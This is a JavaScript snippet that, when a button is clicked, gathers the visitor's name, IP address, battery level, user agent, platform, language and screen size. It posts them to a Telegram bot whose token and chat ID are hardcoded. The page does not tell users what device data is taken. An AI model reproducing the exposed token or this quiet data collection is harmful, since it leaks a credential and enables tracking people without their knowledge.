document.getElementById('sendInfoButton').addEventListener('click', async function () {
    const name = document.getElementById('userName').value;

    // Ensure the name field is filled
    if (!name) {
        alert('Please fill in your name');
        return;
    }

    // Get battery information
    let batteryLevel = 'N/A'; // Default value if battery info is not available
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = (battery.level * 100).toFixed(0) + '%'; // Convert to percentage
    }

    // Get IP address using a public API
    let ipAddress = 'N/A';
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        ipAddress = data.ip; // Extract the IP address
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }

    // Get User Agent and Platform
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;

    // Get additional device information
    const language = navigator.language || navigator.userLanguage; // Browser language
    const screenWidth = window.screen.width; // Screen width
    const screenHeight = window.screen.height; // Screen height
    const onlineStatus = navigator.onLine ? 'Online' : 'Offline'; // Online status

    // Construct the message text with additional info
    const botToken = '6524346899:AAFrXk72Y4VAfMXWsCoLfUPpRy-oSx4fefo';
    const chatId = '5747112293'; // Your chat ID
    const messageText = `
        User Info:
        Name: ${name}
        Battery Level: ${batteryLevel}
        IP Address: ${ipAddress}
        User Agent: ${userAgent}
        Platform: ${platform}
        Language: ${language}
        Screen Size: ${screenWidth} x ${screenHeight}
        Status: ${onlineStatus}
    `; // Multi-line message for better readability

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText
            })
        });

        const responseData = await response.json();
        console.log('Response from Telegram:', responseData);

        if (response.ok) {
            alert('Information sent successfully!');
        } else {
            console.error('Error sending message:', responseData.description);
            alert('Failed to send information. Please try again.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('An error occurred. Please try again.');
    }
});
